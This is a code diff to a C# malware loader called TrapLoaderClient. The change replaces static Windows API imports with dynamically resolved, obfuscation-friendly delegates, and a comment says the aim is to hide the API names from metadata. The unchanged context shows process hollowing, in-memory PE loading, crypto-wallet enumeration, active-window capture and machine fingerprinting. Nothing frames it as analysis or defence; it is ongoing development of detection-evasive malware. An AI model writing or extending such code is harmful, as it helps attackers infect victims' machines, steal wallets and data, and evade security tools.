@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -15,6 +15,7 @@ using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using Microsoft.Win32;
 
 public class TrapLoaderClient
 {
@@ -116,40 +117,27 @@ public class TrapLoaderClient
     private static string _cachedComputerName = null;
     private static readonly object _computerNameLock = new object();
 
-    // ==================== Windows API Imports ====================
+    // ==================== Windows API (dynamic resolution) ====================
+
+    // Resolver primitives — benign, ubiquitous Win32 APIs kept as static imports
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr GetModuleHandleA(string lpModuleName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr LoadLibraryA(string lpLibFileName);
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr GetProcAddress(IntPtr hModule, int ordinal);
 
     // Registry
-    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-    private static extern int RegOpenKeyEx(
-        IntPtr hKey, string lpSubKey, uint ulOptions, uint samDesired, out IntPtr phkResult);
-
-    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-    private static extern int RegQueryValueEx(
-        IntPtr hKey, string lpValueName, IntPtr lpReserved, out uint lpType,
-        byte[] lpData, ref uint lpcbData);
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    private static extern int RegCloseKey(IntPtr hKey);
-
     private static readonly IntPtr HKEY_LOCAL_MACHINE = new IntPtr(unchecked((int)0x80000002));
     private const uint KEY_READ = 0x20019;
     private const uint KEY_WOW64_64KEY = 0x0100;
     private const uint REG_SZ = 1;
     private const uint REG_DWORD = 4;
-
-    // Console
-    [DllImport("kernel32.dll")]
-    private static extern bool AllocConsole();
-
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetConsoleWindow();
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool AttachConsole(int dwProcessId);
-
-    // OS version
-    [DllImport("ntdll.dll")]
-    private static extern int RtlGetVersion(ref OSVERSIONINFOEX lpVersionInformation);
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct OSVERSIONINFOEX
@@ -168,129 +156,124 @@ public class TrapLoaderClient
         public byte wReserved;
     }
 
-    // Memory management
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr VirtualAlloc(
-        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    // Delegate types (param identifiers are innocuous)
+    private delegate int _Da(IntPtr a, string b, uint c, uint d, out IntPtr e);
+    private delegate int _Db(IntPtr a, string b, IntPtr c, out uint d, byte[] e, ref uint f);
+    private delegate int _Dc(IntPtr a);
+    private delegate bool _Dd();
+    private delegate IntPtr _De();
+    private delegate bool _Df(int a);
+    private delegate int _Dg(ref OSVERSIONINFOEX a);
+    private delegate IntPtr _Dh(IntPtr a, uint b, uint c, uint d);
+    private delegate bool _Di(IntPtr a, uint b, uint c);
+    private delegate bool _Dj(IntPtr a, uint b, uint c, out uint d);
+    private delegate IntPtr _Dk(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, out uint f);
+    private delegate uint _Dl(IntPtr a, uint b);
+    private delegate bool _Dm(IntPtr a);
+    private delegate bool _Dn(IntPtr a, out uint b);
+    private delegate bool _Do(IntPtr a, IntPtr b, UIntPtr c);
+    private delegate IntPtr _Dp();
+    private delegate bool _Dq(string a, string b, IntPtr c, IntPtr d, bool e, uint f, IntPtr g, string h, ref STARTUPINFO i, out PROCESS_INFORMATION j);
+    private delegate int _Dr(IntPtr a, int b, ref PROCESS_BASIC_INFORMATION c, int d, out int e);
+    private delegate int _Ds(IntPtr a, int b, ref IntPtr c, int d, out int e);
+    private delegate bool _Dt(IntPtr a, IntPtr b, byte[] c, int d, out int e);
+    private delegate IntPtr _Du(IntPtr a, IntPtr b, uint c, uint d, uint e);
+    private delegate int _Dv(IntPtr a, IntPtr b);
+    private delegate uint _Dw(IntPtr a);
+    private delegate bool _Dx(IntPtr a, uint b);
+    private delegate bool _Dy(IntPtr a, IntPtr b);
+    private delegate bool _Daa(string a, StringBuilder b, int c, out uint d, out uint e, out uint f, StringBuilder g, int h);
+    private delegate bool _Dab(StringBuilder a, ref uint b);
+    private delegate bool _Dac(IntPtr a, out bool b);
+    private delegate IntPtr _Dad();
+    private delegate int _Dae(IntPtr a, StringBuilder b, int c);
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+    // Resolved delegate fields. Names intentionally equal the original APIs so call
+    // sites are unchanged; the obfuscator renames these fields (removing the Win32
+    // names from metadata). The plaintext API names exist only as encrypted literals.
+    private static _Da RegOpenKeyEx;
+    private static _Db RegQueryValueEx;
+    private static _Dc RegCloseKey;
+    private static _Dd AllocConsole;
+    private static _De GetConsoleWindow;
+    private static _Df AttachConsole;
+    private static _Dg RtlGetVersion;
+    private static _Dh VirtualAlloc;
+    private static _Di VirtualFree;
+    private static _Dj VirtualProtect;
+    private static _Dk CreateThread;
+    private static _Dl WaitForSingleObject;
+    private static _Dm CloseHandle;
+    private static _Dn GetExitCodeThread;
+    private static _Do FlushInstructionCache;
+    private static _Dp GetCurrentProc;
+    private static _Dq CreateProcessW;
+    private static _Dr NtQueryInformationProcess;
+    private static _Ds NtQueryInformationProcess_IntPtr;
+    private static _Dt ReadProcessMemory;
+    private static _Dt WriteProcessMemory;
+    private static _Du VirtualAllocEx;
+    private static _Dv NtUnmapViewOfSection;
+    private static _Dw ResumeThread;
+    private static _Dx TerminateProcess;
+    private static _Dy GetThreadContext;
+    private static _Dy SetThreadContext;
+    private static _Dy Wow64GetThreadContext;
+    private static _Dy Wow64SetThreadContext;
+    private static _Daa GetVolumeInformation;
+    private static _Dab GetComputerName;
+    private static _Dac IsWow64Process;
+    private static _Dad GetForegroundWindow;
+    private static _Dae GetWindowText;
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool VirtualProtect(
-        IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+    private static IntPtr _hmK, _hmN, _hmA, _hmU;
 
-    // Threading
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr CreateThread(
-        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
-        IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+    private static T _resolveApi<T>(IntPtr h, string n) where T : Delegate
+    {
+        IntPtr p = GetProcAddress(h, n);
+        return p == IntPtr.Zero ? default(T) : Marshal.GetDelegateForFunctionPointer<T>(p);
+    }
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool CloseHandle(IntPtr hObject);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
-
-    // Module management
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr GetModuleHandleA(string lpModuleName);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr LoadLibraryA(string lpLibFileName);
-
-    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, int ordinal);
-
-    // Cache and process
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
-
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetCurrentProcess();
-
-    // Process hollowing
-    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-    private static extern bool CreateProcessW(
-        string lpApplicationName, string lpCommandLine,
-        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
-        bool bInheritHandles, uint dwCreationFlags,
-        IntPtr lpEnvironment, string lpCurrentDirectory,
-        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
-    [DllImport("ntdll.dll", SetLastError = true)]
-    private static extern int NtQueryInformationProcess(
-        IntPtr hProcess, int processInformationClass,
-        ref PROCESS_BASIC_INFORMATION processInformation,
-        int processInformationLength, out int returnLength);
-
-    [DllImport("ntdll.dll", SetLastError = true, EntryPoint = "NtQueryInformationProcess")]
-    private static extern int NtQueryInformationProcess_IntPtr(
-        IntPtr hProcess, int processInformationClass,
-        ref IntPtr processInformation,
-        int processInformationLength, out int returnLength);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool ReadProcessMemory(
-        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
-        int dwSize, out int lpNumberOfBytesRead);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool WriteProcessMemory(
-        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
-        int dwSize, out int lpNumberOfBytesWritten);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr VirtualAllocEx(
-        IntPtr hProcess, IntPtr lpAddress, uint dwSize,
-        uint flAllocationType, uint flProtect);
-
-    [DllImport("ntdll.dll", SetLastError = true)]
-    private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern uint ResumeThread(IntPtr hThread);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool Wow64GetThreadContext(IntPtr hThread, IntPtr lpContext);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool Wow64SetThreadContext(IntPtr hThread, IntPtr lpContext);
-
-    // Volume serial number
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool GetVolumeInformation(
-        string lpRootPathName,
-        StringBuilder lpVolumeNameBuffer, int nVolumeNameSize,
-        out uint lpVolumeSerialNumber,
-        out uint lpMaximumComponentLength,
-        out uint lpFileSystemFlags,
-        StringBuilder lpFileSystemNameBuffer, int nFileSystemNameSize);
-
-    // Computer name
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool GetComputerName(
-        StringBuilder lpBuffer, ref uint nSize);
-
-    // IsWow64Process
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
-
+    private static void _initApis()
+    {
+        _hmK = GetModuleHandleA("kernel32.dll");
+        _hmN = GetModuleHandleA("ntdll.dll");
+        _hmA = GetModuleHandleA("advapi32.dll");
+        _hmU = GetModuleHandleA("user32.dll");
+        RegOpenKeyEx = _resolveApi<_Da>(_hmA, "RegOpenKeyEx");
+        RegQueryValueEx = _resolveApi<_Db>(_hmA, "RegQueryValueEx");
+        RegCloseKey = _resolveApi<_Dc>(_hmA, "RegCloseKey");
+        AllocConsole = _resolveApi<_Dd>(_hmK, "AllocConsole");
+        GetConsoleWindow = _resolveApi<_De>(_hmK, "GetConsoleWindow");
+        AttachConsole = _resolveApi<_Df>(_hmK, "AttachConsole");
+        RtlGetVersion = _resolveApi<_Dg>(_hmN, "RtlGetVersion");
+        VirtualAlloc = _resolveApi<_Dh>(_hmK, "VirtualAlloc");
+        VirtualFree = _resolveApi<_Di>(_hmK, "VirtualFree");
+        VirtualProtect = _resolveApi<_Dj>(_hmK, "VirtualProtect");
+        CreateThread = _resolveApi<_Dk>(_hmK, "CreateThread");
+        WaitForSingleObject = _resolveApi<_Dl>(_hmK, "WaitForSingleObject");
+        CloseHandle = _resolveApi<_Dm>(_hmK, "CloseHandle");
+        GetExitCodeThread = _resolveApi<_Dn>(_hmK, "GetExitCodeThread");
+        FlushInstructionCache = _resolveApi<_Do>(_hmK, "FlushInstructionCache");
+        GetCurrentProc = _resolveApi<_Dp>(_hmK, "GetCurrentProcess");
+        CreateProcessW = _resolveApi<_Dq>(_hmK, "CreateProcessW");
+        NtQueryInformationProcess = _resolveApi<_Dr>(_hmN, "NtQueryInformationProcess");
+        NtQueryInformationProcess_IntPtr = _resolveApi<_Ds>(_hmN, "NtQueryInformationProcess");
+        ReadProcessMemory = _resolveApi<_Dt>(_hmK, "ReadProcessMemory");
+        VirtualAllocEx = _resolveApi<_Du>(_hmK, "VirtualAllocEx");
+        NtUnmapViewOfSection = _resolveApi<_Dv>(_hmN, "NtUnmapViewOfSection");
+        ResumeThread = _resolveApi<_Dw>(_hmK, "ResumeThread");
+        TerminateProcess = _resolveApi<_Dx>(_hmK, "TerminateProcess");
+        GetThreadContext = _resolveApi<_Dy>(_hmK, "GetThreadContext");
+        SetThreadContext = _resolveApi<_Dy>(_hmK, "SetThreadContext");
+        Wow64GetThreadContext = _resolveApi<_Dy>(_hmK, "Wow64GetThreadContext");
+        Wow64SetThreadContext = _resolveApi<_Dy>(_hmK, "Wow64SetThreadContext");
+        GetVolumeInformation = _resolveApi<_Daa>(_hmK, "GetVolumeInformation");
+        GetComputerName = _resolveApi<_Dab>(_hmK, "GetComputerName");
+        IsWow64Process = _resolveApi<_Dac>(_hmK, "IsWow64Process");
+        GetForegroundWindow = _resolveApi<_Dad>(_hmU, "GetForegroundWindow");
+        GetWindowText = _resolveApi<_Dae>(_hmU, "GetWindowText");
+    }
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct STARTUPINFO
     {
@@ -396,6 +379,8 @@ public class TrapLoaderClient
 
     public static int Main(string[] args)
     {
+        try { _initApis(); }
+        catch { }
         try
         {
             _logFile = Path.Combine(Path.GetTempPath(), "stub_debug.log");
@@ -1017,7 +1002,7 @@ public class TrapLoaderClient
         try
         {
             bool isWow64;
-            if (IsWow64Process(GetCurrentProcess(), out isWow64))
+            if (IsWow64Process(GetCurrentProc(), out isWow64))
                 return isWow64;
         }
         catch { }
@@ -1617,12 +1602,6 @@ public class TrapLoaderClient
         return walletNames.Count == 0 ? "None" : string.Join(", ", walletNames.Distinct());
     }
 
-    [DllImport("user32.dll")]
-    private static extern IntPtr GetForegroundWindow();
-
-    [DllImport("user32.dll")]
-    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
-
     private static string GetActiveWindowTitle()
     {
         try
@@ -1640,16 +1619,21 @@ public class TrapLoaderClient
     {
         try
         {
-            System.Management.ManagementObjectSearcher searcher = new System.Management.ManagementObjectSearcher(
-                "SELECT * FROM Win32_PnPEntity WHERE PNPClass = 'Camera' OR PNPClass = 'Image'");
-            int count = 0;
-            foreach (System.Management.ManagementObject obj in searcher.Get())
+            string[] subKeys = Registry.LocalMachine.OpenSubKey(
+                @"SYSTEM\CurrentControlSet\Control\Class\{e5323777-f976-4f5b-9b55-b94699c46e44}")?
+                .GetSubKeyNames();
+            if (subKeys != null)
             {
-                count++;
-                obj.Dispose();
+                foreach (string sub in subKeys)
+                {
+                    string desc = Registry.LocalMachine.OpenSubKey(
+                        @"SYSTEM\CurrentControlSet\Control\Class\{e5323777-f976-4f5b-9b55-b94699c46e44}\" + sub)?
+                        .GetValue("DriverDesc")?.ToString();
+                    if (!string.IsNullOrEmpty(desc) && !sub.Equals("DriverDesc", StringComparison.OrdinalIgnoreCase))
+                        return "Yes";
+                }
             }
-            searcher.Dispose();
-            return count > 0 ? "Yes" : "No";
+            return "No";
         }
         catch { return "Unknown"; }
     }
@@ -2050,7 +2034,6 @@ public class TrapLoaderClient
                         "System.Drawing.dll",
                         "System.IO.Compression.dll",
                         "System.IO.Compression.FileSystem.dll",
-                        "System.Management.dll",
                         "System.Net.Http.dll",
                         "System.Runtime.Serialization.dll",
                         "System.Security.dll",
@@ -2665,7 +2648,7 @@ public class TrapLoaderClient
             }
 
             ApplySectionProtections(baseAddress, fileBytes, pe);
-            FlushInstructionCache(GetCurrentProcess(), baseAddress, new UIntPtr(pe.SizeOfImage));
+            FlushInstructionCache(GetCurrentProc(), baseAddress, new UIntPtr(pe.SizeOfImage));
             CallTlsCallbacks(baseAddress, pe);
 
             if (pe.AddressOfEntryPoint == 0)
